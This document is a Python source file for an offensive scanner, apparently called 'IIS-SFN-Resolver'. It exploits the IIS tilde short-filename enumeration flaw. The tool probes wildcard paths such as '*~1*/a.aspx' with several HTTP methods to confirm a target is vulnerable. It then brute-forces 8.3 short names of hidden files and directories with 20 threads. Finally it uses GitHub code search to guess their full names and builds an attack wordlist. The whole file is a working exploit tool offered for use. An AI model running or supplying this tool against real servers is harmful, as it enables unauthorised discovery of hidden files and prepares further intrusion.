#!/usr/bin/env python
# IIS-SFN-Resolver: Final Professional Edition
import sys, threading, time, ssl, requests, argparse
import http.client as httplib
import urllib.parse as urlparse
import queue

class GitHubNameSearcher:
    def __init__(self, token=None):
        self.base_url = "https://api.github.com/search/code"
        self.token = token
        self.headers = {"Accept": "application/vnd.github.v3+json"}
        if self.token: self.headers["Authorization"] = f"token {self.token}"

    def search_full_names(self, sfn_prefix, short_ext=None):
        if not self.token: return [], True
        query = f"filename:{sfn_prefix}"
        if short_ext: query += f" extension:{short_ext}"
        params = {"q": query, "per_page": 100}

        while True:
            try:
                response = requests.get(self.base_url, headers=self.headers, params=params)
                if response.status_code == 200:
                    items = response.json().get('items', [])
                    return sorted(list(set(item['name'] for item in items))), False
                elif response.status_code == 401:
                    print("[!] Error 401: Invalid GitHub Token.")
                    return [], True
                elif response.status_code == 403:
                    print("[!] GitHub Rate limit. Sleeping 20s...")
                    time.sleep(20)
                    continue
                return [], False
            except: return [], False

class Scanner(object):
    def __init__(self, target, github_token=None):
        self.target = target.lower()
        if not self.target.startswith('http'): self.target = 'http://%s' % self.target
        self.scheme, self.netloc, self.path, _, _, _ = urlparse.urlparse(self.target)
        if self.path[-1:] != '/': self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files, self.dirs = [], []
        self.queue = queue.Queue()
        self.msg_queue = queue.Queue()
        self.STOP_ME = False
        self.request_method = 'GET'
        self.github = GitHubNameSearcher(github_token)
        threading.Thread(target=self._print_worker, daemon=True).start()

    def _get_status(self, path):
        try:
            conn = httplib.HTTPSConnection(self.netloc) if self.scheme == 'https' else httplib.HTTPConnection(self.netloc)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
                "Connection": "close"
            }
            conn.request(self.request_method, path, headers=headers)
            status = conn.getresponse().status
            conn.close()
            return status
        except: return 0

    def _get_clean_keyword(self, filename):
        """
        Literal stripping: 'web.config.bak' -> 'web'
        Takes the part before the very first dot.
        """
        return filename.split('.')[0]

    def _get_parts_from_sfn(self, sfn_part):
        """
        Splits SFN like 'WEBCO~1.CON' into ('WEBCO', 'CON')
        """
        try:
            name_base = sfn_part.split('~')[0].upper()
            short_ext = sfn_part.split('.')[-1].replace('*', '').upper() if '.' in sfn_part else ""
            return name_base, short_ext
        except:
            return sfn_part.split('~')[0].upper(), ""

    def is_vulnerable(self):
        """Advanced multi-check for vulnerability"""
        # Patterns to test: [Path Wildcard, Sub-path wildcard, Legacy check]
        patterns = [
            (self.path + '*~1****/a.aspx', self.path + '/l1j1e*~1*/a.aspx'),
            (self.path + '*~1*', self.path + '/l1j1e*~1*'),
        ]
        
        for method in ['GET', 'OPTIONS', 'DEBUG']:
            self.request_method = method
            for valid, invalid in patterns:
                s1 = self._get_status(valid)
                s2 = self._get_status(invalid)
                if s1 != 0 and s1 != s2:
                    print(f"[+] Vulnerability confirmed via {method} with code {s1} vs {s2}")
                    return True
        return False

    def _print_worker(self):
        while not self.STOP_ME or not self.msg_queue.empty():
            try: print(self.msg_queue.get(timeout=0.1))
            except: continue

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    if len(url) - len(self.path) < 6:
                        for c in self.alphanum: self.queue.put((url + c, ext))
                    else:
                        if ext == '.*': self.queue.put((url, '')) 
                        if ext == '':
                            self.dirs.append(url + '~1')
                            self.msg_queue.put(f"[+] Found DIR SFN: {url.split('/')[-1]}~1")
                        elif len(ext) == 5 or (not ext.endswith('*')):
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put(f"[+] Found FILE SFN: {url.split('/')[-1]}~1{ext}")
                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put((url, ext[:-1] + c + '*'))
                                if len(ext) < 4: self.queue.put((url, ext[:-1] + c))
            except queue.Empty: break

    def resolve_all(self, output_file):
        if not self.github.token:
            print("\n[!] No GitHub token. Skipping Phase 2.")
            return

        ext_list = []
        try:
            with open('extensions.txt', 'r') as f:
                ext_list = [l.strip() if l.startswith('.') else '.' + l.strip() for l in f]
        except: 
            print("[!] No extensions.txt found for file fuzzing.")

        results = set()
        total_sfns = len(self.dirs) + len(self.files)
        current_count = 0
        print("\n" + "="*60 + "\nPHASE 2: LIVE WORDLIST GENERATION (With Ext Filtering)\n" + "="*60)
        
        # 1. Resolve Directories (Strictly no extensions)
        for d_url in self.dirs:
            current_count += 1
            sfn_full = d_url[1:] # Strip the first / from the short name
            base, _ = self._get_parts_from_sfn(sfn_full)
            matches, stop = self.github.search_full_names(base)
            if stop: break
            for m in matches:
                if m.upper().startswith(base):
                    word = self._get_clean_keyword(m)
                    if word not in results:
                        print(f"DIR SFN  | {current_count}/{total_sfns} | {word}")
                        results.add(word)
            time.sleep(2)

        # 2. Resolve Files (Filtered by 3-char short extension)
        for f_url in self.files:
            current_count += 1
            sfn_full = f_url.split('/')[-1]
            base, short_ext = self._get_parts_from_sfn(sfn_full) # e.g., 'ASP'
            
            matches, stop = self.github.search_full_names(base, short_ext)
            if stop: break
            
            for m in matches:
                if m.upper().startswith(base):
                    keyword = self._get_clean_keyword(m)
                    
                    for e in ext_list:
                        # NEW FILTER: Only append if the extension matches the SFN hint
                        # e.g., if short_ext is 'ASP', only '.aspx' or '.asp' pass
                        clean_ext = e.replace('.', '').upper()
                        if clean_ext.startswith(short_ext):
                            word = f"{keyword}{e}"
                            if word not in results:
                                print(f"FILE SFN | {current_count}/{total_sfns} | {word}")
                                results.add(word)
            time.sleep(2)

        if output_file and results:
            with open(output_file, 'w') as f:
                for r in sorted(results): f.write(r + '\n')
            print(f"\n[!] Complete. Filtered wordlist saved to {output_file}")

    def run(self):
        for c in self.alphanum: self.queue.put((self.path + c, '.*'))
        threads = [threading.Thread(target=self._scan_worker) for _ in range(20)]
        for t in threads: t.start()
        for t in threads: t.join()
        self.STOP_ME = True

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('u', help='Target URL')
    p.add_argument('-t', '--token', help='GitHub Token')
    p.add_argument('-o', '--output', help='Output file')
    p.add_argument('-f', '--force', action='store_true', help='Force scan')
    args = p.parse_args()
    s = Scanner(args.u, args.token)
    if args.force or s.is_vulnerable():
        print("[+] Starting Scan...")
        s.run()
        s.resolve_all(args.output)
    else:
        print("[-] Target reported not vulnerable. Use -f to bypass.")